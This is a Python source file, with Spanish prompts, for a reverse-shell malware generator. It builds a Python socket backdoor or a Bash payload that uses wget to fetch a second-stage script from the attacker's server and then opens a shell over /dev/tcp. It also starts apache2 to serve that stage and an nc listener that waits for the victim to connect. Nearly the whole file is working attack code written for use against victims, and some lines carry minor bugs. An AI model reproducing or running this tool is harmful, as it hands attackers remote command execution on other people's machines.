import os
import time 
from banner import *

rojo = "\033[0;31m"
verde = "\033[0;32m"
azul = "\033[0;34m"
purpura = "\033[0;35m"
amarillo = "\033[1;33m"
negrita = "\033[1m"
fin = "\033[0m"


advertencia = rojo + negrita + "texto" + fin
comentarios = azul + negrita + "bash .autoshell.sh" + fin
pregunta = amarillo + negrita + "bash .autoshell.sh" + fin


path_malware = os.getcwd()+ '/malware_victima/'

os.system('service apache2 start')

def clearScr():
    os.system('clear')


def option_listener_yes(): 
     clearScr()
     print(""+ rojo +"No cierre esta terminal, cuando la victima habra el archivo se habrá conectado a la maquina remotamente."+ fin +"")
     print(""+ negrita +"UNA VEZ REALIZADA UNA SESION PONGA EL SIGUIENTE COMANDO EN LA TERMINAL > "+ comentarios +" <"+ negrita +" para utilizar la interfaz de comandos")
     os.system('nc -nlvp '+ puerto +'') 


def option_listener_yes2():
    clearScr()
    print(""+ rojo +"No cierre esta terminal, cuando la victima habra el archivo se habrá conectado a la maquina remotamente."+ fin +"")
    os.system('nc -nlvp '+ puerto +'')

clearScr()
banner()

numero = int(input("""
\033[1;33m Escoja la opcion que desea \033[0m

1: reverse shell Python {.py} /simple/
2: reverse shell Bash {.sh} /command interface/ \x1b[1;32m {Recommended} \033[0m 
3: reverse shell Python {.py} /command interface/ \x1b[1;32m {Recommended} \033[0m 

\033[1;33m >>>  \033[0m """))

clearScr()

if numero == 1: 
   ip = input("""
   Introduzca su ip
   
   >  """)

   modify_ip = "\'"+ ip +"\'"
    
   puerto = input("""
   Introduzca un puerto {ejemplo: 4444}
   
   >  """)

   name_malware = input("""
   Nombre del archivo malicioso
   >  """)
   
   os.system('cp autoshell.sh /var/www/html')

   clearScr()

   viruspy = "import socket\n"\
             "import subprocess\n"\
             "cliente = socket.socket()\n"\
             "try:\n"\
             "   cliente.connect(("+ modify_ip +","+ puerto +"))\n"\
             "   cliente.send(\"shell > \".encode(\"ascii\"))\n"\
             "   while True:\n"\
             "       comandoBytes=cliente.recv(1024)\n"\
             "       comandoCodificado=comandoBytes.decode(\"ascii\")\n"\
             "       comando=subprocess.Popen(comandoCodificado,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)\n"\
             "       cliente.send(comando.stdout.read())\n"\
             "       cliente.send(\"shell > \".encode(\"ascii\"))\n"\
             "except:\n"\
             "    print(\"Has salido\")\n"\
             "    pass"


   with open(""+ path_malware +""+ name_malware +".py", "w")as f:
      f.write(viruspy)
   clearScr()
   print("El malware se encuentra en la carpeta {malware}")
   path_malwaree = os.getcwd()+ "/malware_victima/""+ name_malware "
   print("Ruta absoluta malware >"+ path_malwaree +"")  
   
   time.sleep(2)
   clearScr()
   option_listen = input("""
   Ahora necesita abrir un listener en el puerto escogido para poder conecatarse cuando la victima ejecute el archivo.
   
   Quiere desplegar un listener?  [y/n] 
   
    >  """)
   
   if option_listen == "y":
      option_listener_yes2()


   if option_listen == "Y":
      option_listener_yes2()


   else:
      print("Sin listener no puedo conectarme al equipo victima :(")
      print("Puede poner el comando ["+ azul +""+ negrita +"nc -nlvp PUERTO ESCUCHA"+ fin +"] para abrir un listener.")
             


if numero == 2:
   clearScr()
   ip = input("""
   Introduzca su ip
   
   >  """)
    
   puerto = input("""
   Introduzca un puerto {ejemplo: 4444}
   
   >  """)
   name_malware = input("""
   Nombre del archivo malicioso
   >  """)

   os.system('cp autoshell.sh /var/www/html') 

   virussh = "#!/bin/bash\n"\
             "wget http://"+ ip +"/autoshell.sh\n"\
             "mv autoshell.sh .autoshell.sh\n"\
             "bash -i >& /dev/tcp/"+ ip +"/"+ puerto +" 0>&1"
   
   clearScr()
   with open(""+ path_malware +""+ name_malware +".sh", "w")as f:
       f.write(virussh)
   print("El malware se encuentra en la carpeta {malware}")
   path_malwaree = os.getcwd()+ "/malware_victima/""+ name_malware +"
   print(path_malwaree)  
   time.sleep(2)
   clearScr()
   option_listen = input("""
   Ahora necesita abrir un listener en el puerto escogido para poder conectarse cuando la victima ejecute el archivo.
       
   Quiere desplegar un listener?  [y/n]
       
   >  """)

   if option_listen == "y":
      clearScr()
      option_listener_yes()
      
   if option_listen == "Y":
      clearScr() 
      option_listener_yes()
     
  
   else:
     print("""
           Sin listener no puedo entrar al equipo victima :(
           Puede poner el comando [nc -nlvp PUERTO ESCOGIDO] para abrir un listener.""")

               
if numero == 3:
    clearScr()
    os.system('cp autoshell.sh /var/www/html') 
    ip = input("""

    Introduzca su IP

    >  """)

    puerto = input("""

    Introduzca un puerto

    >  """)

    name_malware = input("""

    Introduzca un nombren para el archivo

    >  """)

    clearScr()

    os.system('cp plantilla.py '+ name_malware +'.py')
    with open(""+ name_malware +".py", "rt")as f:
      x = f.read()

    with open("" + name_malware +".py", "wt")as f:
      x = x.replace("ip", ""+ ip +"")
      x = x.replace("puerto", ""+ puerto +"")
      f.write(x)
    os.system('mv '+ name_malware +'.py '+ path_malware +'')

    print("El malware se encuentra en la carpeta {malware_victima}")
    path_malwaree = os.getcwd()+ "/malware_victima/"
    print( path_malwaree)  
    time.sleep(2)
    clearScr()
    option_listen = input("""
    Ahora necesita abrir un listener en el puerto escogido para poder conecatarse cuando la victima ejecute el archivo.
   
    Quiere desplegar un listener?  [y/n] 
   
    >  """)
         
    if option_listen == "y":
        option_listener_yes()
         
    if option_listen == "Y":
        option_listener_yes

    else:
      print("Sin listener no me puedo conectar")
                      


    

   
   
   
   
   
